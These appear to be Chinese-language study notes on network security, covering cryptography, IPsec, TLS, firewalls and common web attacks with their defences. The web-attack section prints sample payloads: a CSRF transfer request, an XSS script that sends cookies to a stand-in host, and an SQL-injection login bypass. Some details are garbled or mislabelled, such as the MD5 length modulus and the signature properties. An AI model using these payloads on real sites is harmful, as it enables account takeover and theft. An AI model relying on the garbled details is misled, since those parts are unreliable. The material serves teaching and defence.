公钥密码体制产生的主要原因：常规密钥密码体制的密钥分配问题，以及对**数字签名**的需求。

在公钥密码体制中，**加密密钥 PK**（public key，即公钥）是向公众**公开**的，而**解密密钥 SK**（secret key，即私钥或秘钥）则是需要**保密**的。加密算法 E 和解密算法 D 也都是**公开**的。虽然私钥 SK 是由公钥 PK 决定的，但却**不能**根据 PK 计算出 SK。 

###### (2) 公钥算法

密钥对**产生器**产生出接收者 B 的一对密钥：**加密密钥 PKB 和解密密钥 SKB** 。加密密钥 PKB 就是接收者 B 的**公钥**，它向公众**公开**。解密密钥 SKB 就是接收者 B 的**私钥**，对其他人都**保密**。发送者 A 用 B 的公钥 PKB 对明文 X 加密（E 运算）后，接收者 B 用自己的私钥 SKB 解密（D 运算），即可恢复出明文。

<img src="assets/1574751791422.png" alt="1574751791422" style="zoom:45%;" />

###### (3) 公开密钥与对称密钥的区别

在使用**对称密钥**时，由于双方使用同样的密钥，因此在通信信道上可以进行**一对一的双向保密通信**，每一方既可用此密钥加密明文，并发送给对方，也可接收密文，用同一密钥对密文解密。这种保密通信仅限于持有此密钥的双方（如再有第三方就不保密了）。在使用**公开密钥**时，在通信信道上可以是**多对一的单向保密通信**。



#### 数字签名

##### 1. 概述

数字签名用于证明**真实性**。数字签名必须保证以下三点：

- **报文鉴别**：接收者能够核实发送者对报文的签名（**证明来源**）；
- **报文的完整性**：发送者事后不能抵赖对报文的签名（**防否认**）；
- **不可否认**：接收者不能伪造对报文的签名（**防伪造**）。

现在已有多种实现各种数字签名的方法。**但采用公钥算法更容易实现**。 

<img src="assets/1574752002800.png" alt="1574752002800" style="zoom:40%;" />

##### 2. 基于公钥的数字签名的实现

A 具有自己的**私钥**，所以除 A 外没有别人能产生这个密文。因此 B 相信报文 X 是 A 签名发送的。若 A 要抵赖曾发送报文给 B，**B 可将明文和对应的密文出示给第三者**。第三者很容易用 A 的**公钥去证实** A 确实发送 X 给 B。反之，若 B 将 X 伪造成 X'，则 B 不能在第三者前出示对应的密文。这样就证明了 **B 伪造**了报文。 

##### 3. 具有保密性的数字签名

<img src="assets/1574752073918.png" alt="1574752073918" style="zoom:45%;" />



#### 鉴别

在信息的安全领域中，对付**被动攻击**的重要措施是**加密**，而对付**主动攻击**中的**篡改和伪造**则要用**鉴别** (authentication)。
报文鉴别使得通信的接收方能够验证所收到的报文（发送者和报文内容、发送时间、序列等）的**真伪**。使用**加密**就可达到**报文鉴别**的目的。但在网络的应用中，许多报文**并不需要**加密。应当使接收者能用很**简单的方法**鉴别报文的真伪。 

**鉴别分类：**

- **报文鉴别**：即鉴别所收到的报文的确是报文的**发送者**所发送的，而不是其他人伪造的或篡改的。这就包含了**端点鉴别和报文完整性**的鉴别。
- **实体鉴别**：仅仅鉴别发送报文的**实体**。实体可以是一个人，也可以是一个进程（客户或服务器）。这就是**端点鉴别**。

##### 1. 报文鉴别

许多报文**并不需要加密**，但却需要**数字签名**，以便让报文的**接收者**能够鉴别报文的**真伪**。然而对很长的报文进行数字签名会使计算机增加很大的**负担**（需要进行很长时间的运算）。当我们传送不需要加密的报文时，应当使接收者能用**很简单**的方法鉴别报文的真伪。

###### (1) 密码散列函数

**数字签名**就能够实现对报文的**鉴别**。但这种方法有一个很大的**缺点**：对较长的报文（这是很常见的）进行数字签名会使计算机增加非常大的负担，因为这需要**较多的时间**来进行运算。**密码散列函数** (cryptographic hash function)是一种**相对简单**的对**报文进行鉴别**的方法。

<img src="assets/1574752501649.png" alt="1574752501649" style="zoom:40%;" />

散列函数的输入长度可以很长，但其**输出长度则是固定**的，并且较短。散列函数的输出叫做**散列值**，或称为散列。
不同的散列值肯定对应于不同的输入，但不同的输入却可能得出相同的散列值。这就是说散列函数的输入和输出并非一一对应，而是**多对一**的。在密码学中使用的散列函数称为密码散列函数。具有**单向性**的特点。要找到两个不同的报文，它们具有同样的密码散列函数输出，在计算上是不可行的。也就是说，**密码散列函数实际上是一种单向函数** (one-way function)。

###### (2) 密码散列函数MD5和SHA

通过许多学者的不断努力，已经设计出一些**实用的密码散列函数**（或称为**散列算法**），其中最出名的就是 **MD5 和 SHA-1**。SHA-1比 MD5 更安全，但计算起来却比 MD5 要慢些。

**MD5报文摘要算法**

**MD5** 是报文摘要 MD (Message Digest) 的第 5 个版本。MD5 的设计者 Rivest 曾提出一个猜想，即根据给定的 MD5 报文摘要代码，要找出一个与原来报文有相同报文摘要的另一报文，其难度在计算上几乎是不可能的。

基本思想：用足够复杂的方法将报文的数据位**充分“弄乱**”，报文摘要代码中的**每一位**都与**原来报文中的每一位有关**。

MD5 实现的报文鉴别**可以防篡改**，但**==不能防伪造==**，因而不能真正实现报文鉴别。

**MD5 计算步骤**

1. **附加**：把任意长的报文按模 264 计算其余数（64位），追加在报文的后面（长度项）。
2. **填充**：在报文和长度项之间填充 1～512 位，使得填充后的总长度是 512 的整数倍。填充的首位是 1，后面都是 0。

<img src="assets/1574752656810.png" alt="1574752656810" style="zoom:46%;" />

3. **分组**：把追加和填充后的报文分割为一个个 512 位的数据块，每个 512 位的报文数据再分成 4 个 128 位的数据块。
4. **计算**：将 4 个 128 位的数据块依次送到不同的散列函数进行 4 轮计算。每一轮又都按 32 位的小数据块进行复杂的运算。一直到最后计算出 MD5 报文摘要代码（128 位）。

**SHA 安全散列算法：**SHA 比 MD5 更安全，已制定 SHA-1、SHA-2、 SHA-3 等版本。现在用的基本都是高版本的。

###### (3) 报文鉴别码MAC

MD5 实现的报文鉴别可以**防篡改**，但**不能防伪造**，因而**不能真正实现报文鉴别**。例如：

(1) 入侵者创建了一个伪造的报文 M，然后计算出其散列 H(M )，并把拼接有散列的扩展报文冒充 A 发送给 B。
(2) B 收到扩展的报文 (M, H(M )) 后， 通过散列函数的运算，计算出收到的报文 MR 的散列 H(MR)。
(3) 若 H(M ) = H(MR)，则 B 就会误认为所收到的伪造报文就是 A 发送的。

为防范上述攻击，可以**对散列进行一次加密**。散列加密后的结果叫做**报文鉴别码 MAC** (Message Authentication Code)。由于入侵者不掌握密钥 K，所以入侵者无法伪造 A 的报文鉴别码 MAC，因而无法伪造 A 发送的报文。这样就**完成了对报文的鉴别**。

<img src="assets/1574752913419.png" alt="1574752913419" style="zoom: 50%;" />

所以现在**整个**的报文是**不需要加密**的。虽然从散列 H 导出报文鉴别码 MAC 需要加密算法，但由于散列 H 的长度通常都远远小于报文 X 的长度，因此这种加密**不会消耗**很多的计算资源。因此，使用**鉴别码 MAC 就能够很方便地保护报文的完整性**。

##### 2. 实体鉴别

实体鉴别与报文鉴别不同。报文鉴别是对**每一个**收到的**报文**都要鉴别报文的发送者。**实体鉴别**是在系统接入的全部持续**时间内**对和自己通信的对方实体**只需验证一次**。 

**使用不重数进行鉴别**

在使用公钥密码体制时，可以对**不重数**进行签名鉴别。B 用其**私钥对不重数** **RA** 进行签名后发回给 A。A 用 B 的公钥核实签名。如能得出自己原来发送的不重数 **RA**，就核实了和自己通信的对方的确是 B。同样，A 也用自己的**私钥对不重数** **RB** 进行签名后发送给 B。B 用 A 的公钥核实签名，鉴别了 A 的身份。公钥密码体制虽然不必在互相通信的用户之间秘密地分配共享密钥，但**仍有**受到攻击的可能。

<img src="assets/1574753036305.png" alt="1574753036305" style="zoom:45%;" />

如下面的**中间人**攻击。A 向 B 发送“我是 A”的报文，并给出了自己的身份。此报文被 “中间人” C 截获，C 把此报文原封不动地转发给 B。B 选择一个不重数 RB 发送给 A，但同样被 C 截获后也照样转发给 A。
中间人 C 用自己的私钥 SKC 对 RB 加密后发回给 B，使 B 误以为是 A 发来的。A 收到 RB 后也用自己的私钥 SKA 对 RB 加密后发回给 B，中途被 C 截获并丢弃。B 向 A 索取其公钥，此报文被 C 截获后转发给 A。

<img src="assets/1574753179454.png" alt="1574753179454" style="zoom:45%;" />

**使用公钥体制进行不重数鉴别**

<img src="assets/1574753070999.png" alt="1574753070999" style="zoom:40%;" />



#### 密钥分配

##### 1. 对称密钥的分配

目前常用的密钥分配方式是设立**密钥分配中心 KDC** (Key Distribution Center)。KDC 是大家都信任的机构，其任务就是给需要进行秘密通信的用户临时分配一个会话密钥（**仅使用一次**）。假设用户 A 和 B 都是 KDC 的登记用户，并已经在 KDC 的服务器上安装了各自和 KDC 进行通信的主密钥（master key）KA 和 KB。 “**主密钥”可简称为“密钥”**。

<img src="assets/1574753485505.png" alt="1574753485505" style="zoom:50%;" />

说明：为防止重放攻击，KDC 还可在报文中加入**时间戳**。会话密钥 KAB 是**一次性**的，因此保密性较高。KDC 分配给用户的密钥 KA 和 KB，应**定期更换**，以减少攻击者破译密钥的机会。目前最出名的**密钥分配协议是 Kerberos V5**。

##### 2. 公钥的分配

在**公钥密码体制**中，如果**每个用户都具有其他用户的公钥**，就可实现安全通信。但不能随意公布用户的公钥，因为无法防止假冒和欺骗。使用者也无法确定公钥的真正拥有者。

需要有一个值得信赖的机构：**即认证中心 CA** (Certification Authority)，来将**公钥**与其对应的**实体**（人或机器）进行**绑定** (binding)。每个**实体**都有 **CA  发来的证书** (certificate)，里面有公钥及其拥有者的标识信息。此**证书被 CA 进行了数字签名，是不可伪造**的，可以信任。证书是一种身份证明，用于解决**信任问题**。



#### 安全协议

##### 1. 网络层安全协议

IP 安全性很差，因为它没有为通信提供良好的数据源鉴别机制；没有为数据提供强大的完整性保护机制；没有为数据提供任何机密性保护；在设计和实现上存在安全漏洞，使各种攻击有机可乘。例如：攻击者很容易构造一个包含虚假地址的 IP 数据报。

所以 IP 几乎不具备任何安全性，**不能保证**：数据机密性、数据完整性、数据来源认证。由于其在设计和实现上存在安全漏洞，使各种攻击有机可乘。例如：攻击者很容易构造一个包含虚假地址的 IP 数据报。**IPsec** 提供了标准、健壮且包含广泛的机制保证 IP 层安全。

###### (1) Psec协议族概述

IPsec 就是**“IP 安全 (security)”**的缩写。IPsec 并不是一个单个的协议，而是能够在 IP 层提供互联网通信安全的**协议族**。IPsec 是个**框架**，它允许通信双方选择合适的算法和参数（例如，密钥长度）。为保证互操作性，IPsec 还包含了所有 IPsec 的实现都必须有的一套**加密算法**。

**组成**：

- **IP 安全数据报格式**的两个协议：鉴别首部 AH (Authentication Header) 协议、**封装安全有效载荷 ESP** (Encapsulation Security Payload) 协议。
- **有关加密算法**的三个协议（在此不讨论）
- **互联网密钥交换 IKE** (Internet Key Exchange) 协议

AH 协议提供源点鉴别和数据完整性，但不能保密。ESP 协议比 AH 协议复杂得多，它提供源点鉴别、数据完整性和保密。**使用 ESP 或 AH 协议的 IP 数据报称为 ==IP 安全数据报==（或 ==IPsec数据报==）**。Ipsec 支持 IPv4 和 IPv6。AH 协议的功能都已包含在 ESP 协议中。

###### (2) IP安全数据报的工作方式

**运输方式**：**==整个运输层报文段==**的前后分别添加若干**控制信息**，再加上 IP 首部，**构成 IP 安全数据报**。适合于主机到主机之间的安全传送。 需要使用 IPsec 的主机都运行 IPsec 协议。

<img src="assets/1574756070267.png" alt="1574756070267" style="zoom:60%;" />

**隧道方式**：在**==原始的 IP 数据报==**的前后分别添加若干**控制信息**，再加上新的 IP 首部，构成一个 IP 安全数据报。需要在 IPsec 数据报所经过的所有路由器上都运行 **IPsec 协议**。隧道方式常用来**实现虚拟专用网 VPN** 的加密。

<img src="assets/1574756133969.png" alt="1574756133969" style="zoom:60%;" />

无论使用哪种方式，最后得出的 IP 安全数据报的 **IP 首部都是不加密**的。所谓“安全数据报”是指数据报的**数据部分是经过加密**的，并能够被鉴别的。通常把数据报的数据部分称为数据报的有效载荷 (payload)。

###### (3) 安全关联

在发送 IP 安全数据报之前，在源实体和目的实体之间必须创建一条**网络层的逻辑连接**。此逻辑连接叫做**安全关联** SA (Security Association) 。**IPsec** 就把传统互联网无连接的网络层**转换为具有逻辑连接的网络层**。 

安全关联是从源点到终点的**单向连接**，它能够提供安全服务。在安全关联 SA 上传送的就是 **IP 安全数据报**。
如要进行双向安全通信，则两个方向都需要建立安全关联。若 n 个员工进行双向安全通信，一共需要创建 (2 + 2n ) 条安全关联 SA。

###### (4) IP 安全数据报的格式

**隧道**方式下的 IP 安全数据报的格式。

<img src="assets/1574756486826.png" alt="1574756486826" style="zoom:60%;" />

##### 2. 运输层安全协议

###### (1) 概述

现在广泛使用的有以下两个协议： 

- **安全套接字层协议 SSL** (Secure Socket Layer) 
- **运输层安全 TLS 协议** (Transport Layer Security)  

安全套接层 SSL 由 Netscape 于 1994 年开发，广泛应用于基于万维网的各种网络应用（但不限于万维网应用）。
SSL 作用在端系统应用层的 **HTTP 和运输层**之间，在 **TCP 之上建立起一个==安全通道==**，为通过 **TCP 传输的应用层**数据提供安全保障。1999 年，IETF 在 **SSL** 3.0 **基础**上推出了**传输层安全标准 TLS**，为**所有基于 TCP 的网络应用**提供安全数据传输服务。

<img src="assets/1574756662496.png" alt="1574756662496" style="zoom:45%;" />

在**发送方**，**SSL** 接收**应用层**的数据，对数据进行**加密**，然后把**加了密**的数据送往 **TCP 套接字**。在**接收方**，**SSL** 从 **TCP** 套接字**读取**数据，**解密**后把数据交给应用层。 

运输层不使用安全协议和**使用安全协议**的对比如下图所示。

<img src="assets/1574756741778.png" alt="1574756741778" style="zoom:52%;" />

SSL / TLS 建立在**可靠的 TCP** 之上，与**应用层协议独立无关**。

**应用层**使用 SSL 最多的就是 **HTTP**，但 SSL 并非仅用于 HTTP，而是可用于**任何应用层**的协议。应用程序 HTTP 调用 **SSL 对整个网页**进行加密时，网页上会提示用户，在网址栏原来显示 http 的地方，现在变成了 **https**。在 http 后面加上的 s 代表 **security**，表明现在使用的是提供安全服务的 HTTP 协议（TCP 的 HTTPS 端口号是 **443**，而不是平时使用的端口号 80）。

**SSL 提供的安全服务**：

- **SSL 服务器鉴别**，允许用户证实服务器的身份。支持 SSL 的客户端 通过验证来自服务器的证书，来鉴别服务器的真实身份并获得服务器的公钥。
- **SSL 客户鉴别**，SSL 的可选安全服务，允许服务器证实客户的身份。
- **加密的 SSL 会话**，对客户和服务器间发送的所有报文进行加密，并检测报文**是否被篡改**。

###### **(2) SSL安全会话建立过程**

<img src="assets/1574756922976.png" alt="1574756922976" style="zoom:55%;" />

1. **协商加密算法**。 ① 浏览器 A 向服务器 B 发送浏览器的 SSL 版本号和一些可选的加密算法。 ② B 从中选定自己所支持的算法（如 RSA），并告知 A。
2. **服务器鉴别**。 ③ 服务器 B 向浏览器 A 发送包含**其 RSA 公钥**的**数字证书**。 ④ A 使用该证书的**认证机构 CA 公开发布的 RSA 公钥对该证书进行验证**。
3. **会话密钥计算**。由浏览器 A 随机产生一个**秘密数**。 ⑤ 用服务器 B 的 **RSA 公钥**进行加密后发送给 B。 ⑥ 双方根据协商的算法产生**共享的对称会话密钥**。
4. **安全数据传输**。 ⑦ 双方用会话密钥加密和解密它们之间传送的数据并验证其完整性。

##### 3. 应用层安全协议

本节仅讨论应用层中有关**电子邮件**的安全协议。发送电子邮件是个即时的行为。发送方 A 和接收方 B 并不会为此而建立任何会话。电子邮件安全协议就应当为每种加密操作定义相应的算法，以及密钥管理、鉴别、完整性保护等方法。



#### 防火墙与入侵检测

##### 1. 防火墙

防火墙是由软件、硬件构成的系统，是一种特殊编程的**路由器**，用来在两个网络之间实施访问控制策略。
访问控制策略是由使用防火墙的单位自行制订的，为的是可以最适合本单位的需要。防火墙内的网络称为“可信的网络”(trusted network)，而将外部的互联网称为“不可信的网络”(untrusted network)。防火墙可用来解决**内联网和外联网**的安全问题。

<img src="assets/1574767301364.png" alt="1574767301364" style="zoom:50%;" />

防火墙的功能有两个：**阻止和允许**。

- “阻止”就是阻止某种类型的通信量通过防火墙（从外部网络到内部网络，或反过来）。
- “允许”的功能与“阻止”恰好相反。

防火墙必须能够识别各种类型的通信量。不过在大多数情况下防火墙的主要功能是“阻止”。

防火墙技术分为一般两类：

**分组过滤路由器**

- 是一种具有分组过滤功能的路由器，它根据过滤规则对进出内部网络的分组执行转发或者丢弃（即过滤）。过滤规则基于分组的网络层或运输层首部的信息，例如：源/目的 IP 地址、源/目的端口、协议类型（TCP 或 UDP）等。
- 分组过滤可以是无状态的，即独立地处理每一个分组。也可以是有状态的，即要跟踪每个连接或会话的通信状态，并根据这些状态信息来决定是否转发分组。
- 简单高效，对用户透明，但不能对高层数据进行过滤。

**应用网关也称为代理服务器 (proxy server)**

- 它在应用层通信中扮演报文中继的角色。
- 每种网络应用需要一个应用网关。
- 在应用网关中，可以实现基于应用层数据的过滤和高层用户鉴别。
- 所有进出网络的应用程序报文都必须通过应用网关。
- 应用网关也有一些缺点：每种应用都需要一个不同的应用网关；在应用层转发和处理报文，处理负担较重；对应用程序不透明，需要在应用程序客户端配置应用网关地址。

##### 2. 入侵检测

防火墙试图在入侵行为发生之前阻止所有可疑的通信。**入侵检测系统 IDS** (Intrusion Detection System) 能够在入侵已经开始，但还没有造成危害或在造成更大危害前，及时检测到入侵，以便尽快阻止入侵，把危害降低到最小。 

IDS 对进入网络的分组执行深度分组检查，当观察到可疑分组时，向网络管理员发出告警或执行阻断操作（由于 IDS 的“误报”率通常较高，多数情况不执行自动阻断）。
IDS 能用于**检测多种网络攻击**，包括网络映射、端口扫描、DoS 攻击、蠕虫和病毒、系统漏洞攻击等。



#### Web攻击技术

总结一下常见的 Web 攻击方法。

- **CSRF 攻击**（关键是借助本地 cookie 进行认证，伪造发送请求）

- **XSS 攻击**（关键是脚本，利用恶意脚本发起攻击）

- **SQL 注入**（关键是通过用 SQL 语句伪造参数发出攻击）
- **DDOS 攻击**（关键是发出大量请求，最后令服务器崩溃）

##### 1. 跨站请求伪造CSRF

###### (1) 概念

跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去**访问一个自己曾经认证过的网站**并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器**曾经认证**过，所以被访问的网站会认为是**真正**的用户操作而去执行。

大致流程：用户登录并浏览正常网站，正常网站服务器响应并且返回标识该用户身份的 **cookie**，此时用户未注销正常网站的情况下，访问恶意网站。此时恶意网站去访问正常网站并且带着标识用户的 cookie，正常网站服务器就会接受来自恶意网站的请求。这些欺骗的访问方式有很多，例如“点击小广告、找回密码”等等诱导用户去点击操作。

###### (2) 攻击原理

假如一家银行用以**执行转账**操作的 URL 地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

比如一个用户**登录**了银行的网站（已经有了 cookie），在这个网站的评论区中有人发了一个学习炒股的超链接，这个人点了之后，这个链接可能执行：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

这就可能造成用户损失 1000 美元。

这种**恶意的网址**可以有很多种形式，藏身于网页中的许多地方。此外攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。

通过例子能够看出，攻击者并**不能通过 CSRF 攻击来直接获取用户的账户控制权**，也不能直接窃取用户的任何信息。他们能做到的就是欺骗用户浏览器，让其以用户的名义执行操作。

总结一下 CSRF 攻击流程：用户登录受**信任网站A**，并在本地**生成 Cookie**。用户在**不登出A**的情况下访问**危险网站 B**，这时候恶意网站就会**利用 cookie** 去发起恶意请求。

###### (3) 防范手段

**I 检查 Referer 首部字段**

**Referer 首部字段**位于 HTTP 报文中，用于**标识请求来源**的地址。检查这个**首部字段**并要求**请求来源**的地址在**同一个域名**下，可以极大的防止 CSRF 攻击。Referer 指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截

这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

**II 使用 Token 验证**

在访问敏感数据请求时，要求用户浏览器提供**不保存在 Cookie** 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。所以可以**采用 token（不存储于浏览器）认证**。

**III 配合验证码进行验证**

因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户**输入验证码**可以让用户知道自己正在做的操作，所以银行转账这些一般都会有短信验证码。

##### 2. 跨站脚本攻击XSS

###### (1) 概念

跨站脚本攻击（Cross-Site Scripting, XSS），可以将**代码**注入到**用户浏览的网页**上，这种代码包括 **HTML** 和 **JS** 代码，从而达到攻击的目的，如盗取用户的 **cookie**，改变网页的 DOM 结构，重定向到其他网页等。其实 XSS 的攻击方式就是想办法“教唆”**浏览器去执行一些这个网页中原本不存在的前端代码**。

**危害**：窃取用户的 Cookie、伪造虚假的输入表单骗取个人信息、显示伪造的文章或者图片等。

###### (2) 攻击原理

例如有一个**论坛网站**，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

被攻击之后该内容可能会被**渲染**成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了**当前作用域的 Cookie**。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

###### (3) 攻击分类举例

**① 反射型XSS**

又称为非持久性跨站点脚本攻击，它是最常见的类型的 XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性 XSS 包含一个带 XSS 攻击向量的链接(即每次攻击需要用户的点击)。

**简单例子**：正常发送消息：`http://www.test.com/message.php?send=Hello,World！`，接收者将会接收信息并显示 Hello,Word。

非正常发送消息：`http://www.test.com/message.php?send=<script>alert(‘foolish!’)</script>！`，接收者接收消息显示的时候将会弹出警告窗口。

**② 持久型XSS**

又称为持久型跨站点脚本，它一般发生在 XSS 攻击向量(一般指 XSS 攻击代码)存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器脚本执行。持久的 XSS 相比非持久性 XSS 攻击危害性更大,因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的 orkut 曾经就遭受到 XSS。

**简单例子：**

从名字就可了解到存储型 XSS 攻击就是将攻击代码存入数据库中，然后客户端打开时就执行这些攻击代码。例如留言板

留言板表单中的表单域：`<input type=“text” name=“content” value=“这里是用户填写的数据”>`

**正常操作：**用户是提交相应留言信息；将数据存储到数据库；其他用户访问留言板，应用去数据并显示。

**非正常操作：**攻击者在value填写`<script>alert(‘foolish!’)</script>`【或者html其他标签（破坏样式。。。）、一段攻击型代码】；将数据存储到数据库中；其他用户取出数据显示的时候，将会执行这些攻击性代码

**③ DOM-based XSS**

基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况**构造 dom 节点**进行 XSS 跨站脚本攻击。

###### (4) 防范手段

记住一句至理名言：“**所有用户输入都是不可信的**。”防范方式很简单，**坚决不要相信用户的任何输入**，并**过滤**掉输入中的所有特殊字符。这样就能消灭绝大部分的 XSS 攻击。

**I 设置 Cookie 为 HttpOnly**

设置了 HttpOnly 的 Cookie 可以**防止 JavaScript 脚本**调用，就无法通过 document.cookie 获取用户 Cookie 信息。

**II 过滤特殊字符，进行转义处理**

例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。

富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。富文本编辑器通常采用 **XSS filter** 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

###### (4) XSS与CSRF区别

**XSS 利用的是==用户==对指定==网站==的信任，CSRF 利用的是==网站==对用户==浏览器==的信任。**

区别一：CSRF 需要用户**先登录**网站，获取 cookie。XSS：**不需要**登录。

区别二：CSRF 是利用网站**本身的漏洞**，去请求网站的 API。XSS 是向网站注入恶意代码，篡改了网页的内容。

##### 3. SQL注入攻击

###### (1) 概念

服务器上的数据库运行**非法的 SQL** 语句，主要通过**拼接**来完成。

###### (2) 攻击原理

例如一个网站登录验证的 SQL 查询代码为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

如果填入以下内容：

```sql
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

那么 SQL 查询字符串为：

```sql
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

此时无需验证通过就能执行以下查询：

```sql
strSQL = "SELECT * FROM users;"
```

###### (3) 防范手段

**I 绑定变量，使用预编译语句**

Java 中的 **PreparedStatement** 是**预先编译**的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。MyBatis 中也有类似机制。绑定变量使用预编译语句是预防 SQL 注入的最佳方式，使用预编译的 SQL 语句语义不会发生改变。

```java
PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND password=?");
stmt.setString(1, userid);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

**II 单引号转换**

将传入的参数中的单引号转换为**连续两个单引号**，PHP 中的 Magic quote 可以完成这个功能。

##### 4. 拒绝服务攻击DOS

###### (1) 概念

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

###### (2) 攻击方法

典型的 DOS 攻击方式如下：

- **SYN Flood** ： 这是一种利用 **TCP 协议**缺陷，发送大量伪造的 **TCP 连接请求**，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方式。TCP 三次握手时，客户端服务器发出请求，请求建立连接，然后服务器返回一个报文，表明请求以被接受，然后客户端也会返回一个报文，最后建立连接。那么如果有这么一种情况，攻击者伪造 IP 地址，发出报文给服务器请求连接，这个时候服务器接受到了，根据 TCP 三次握手的规则，服务器也要回应一个报文，可是这个 **IP 是伪造的**，报文回应给谁呢，**第二次握手出现错误**，第三次自然也就不能顺利进行了，这个时候服务器收不到第三次握手时客户端发出的报文，又再**重复第二次握手**的操作。如果攻击者伪造了大量的 IP 地址并发出请求，这个时候服务器将维护一个非常大的**半连接**等待列表，占用了大量的资源，最后服务器瘫痪。
- **CC 攻击**：CC 攻击是目前应用层攻击的主要手段之一，借助代理服务器生成指向目标系统的合法请求，实现伪装和 DDoS。CC 攻击就模拟多个正常用户不停地访问如论坛这些需要大量数据操作的页面，造成服务器资源的浪费，CPU 长时间处于100%，永远都有处理不完的请求，网络拥塞，正常访问被中止。这种攻击技术性含量高，见不到真实源 IP，见不到特别大的异常流量，但服务器就是无法进行正常连接。

###### (3) 预防

没有根治的办法，除非不用 TCP/IP 链接。

- 确保服务器的系统文件是最新版本，并及时更新系统补丁。
- 正确设置防火墙。关闭不必要的服务，禁止对主机的非开放服务的访问，运行端口映射程序祸端口扫描程序，要认真检查特权端口和非特权端口，启用防火墙的防 DDos 的属性。 
- 限制同时打开 **SYN 的半连接**数目，缩短 SYN 半连接的 time out 时间。
- 限制特定 IP 短地址的访问。
- 认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更，那这台机器就可能遭到了攻击。 
- 限制在防火墙外与网络文件共享。这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会。 

阿里巴巴的安全团队在实战中发现，DDoS 防御产品的核心是**检测技术和清洗技术**。检测技术就是检测网站是否正在遭受 DDoS 攻击，而清洗技术就是清洗掉异常流量。

##### 5. DNS劫持

###### (1) 概述

DNS 劫持攻击亦称为 DNS 重定向是一种网络攻击，攻击者劫持用户的 DNS 请求，错误地解析网站的 IP 地址，用户试图加载，从而将其重定向到网络钓鱼站点。

要执行 DNS 劫持攻击，攻击者要么在用户的系统上安装恶意软件，要么通过利用已知漏洞或破解 DNS 通信来接管路由器。

攻击涉及破坏用户的系统DNS（TCP / IP）设置，以将其重定向到“Rogue DNS”服务器，从而使默认 DNS 设置无效。要执行攻击，攻击者要么在用户的系统上安装恶意软件，要么通过利用已知漏洞或破解 DNS 通信来接管路由器。因此，用户将成为域欺骗或网络钓鱼的受害者。

###### (2) 分类

● **本地DNS劫持攻击**：在本地 DNS 劫持中，攻击者在用户系统上植入恶意软件并修改本地 DNS 设置，因此用户的系统现在使用由攻击者控制的 DNS 服务器。攻击者控制的 DNS 服务器将网站域请求转换为恶意站点的 IP 地址，从而将用户重定向到恶意站点。

● **路由器DNS劫持攻击**：在此类攻击中，攻击者利用路由器中存在的固件漏洞来覆盖 DNS 设置，从而影响连接到该路由器的所有用户。攻击者还可以通过利用路由器的默认密码来接管路由器。

● **中间人（MiTM）DNS攻击**：在这种类型的 DNS 劫持中，攻击者执行中间人（MiTM）攻击以拦截用户和 DNS 服务器之间的通信并提供不同的目标 IP 地址，从而将用户重定向到恶意站点。

###### (3) 防止DNS劫持攻击

● 为防止 DNS 劫持，始终建议使用良好的安全软件和防病毒程序，并确保定期更新软件。 安全专家建议使用公共 DNS 服务器，最好定期检查 DNS 设置是否已修改，并确保 DNS 服务器是安全的。

● 建议使用复杂的密码重置**路由器**的默认密码。使用 DNS 注册器时使用双因素身份验证，并修补路由器中存在的所有漏洞以避免危害。

● 最好远离不受信任的网站，避免下载任何免费的东西。如果已被劫持，建议删除HOSTS文件的内容并重置 Hosts File。



#### 面试题

##### 1. 怎么知道连接是恶意的呢？可能是正常连接？

1. **验证码**（最简单有效的防护），采用点触验证，**滑动验证或第三方验证码**服务，普通验证码很容易被破解。
2. 频率，限制同设备，同 IP 等发送次数，单点时间范围可请求时长。
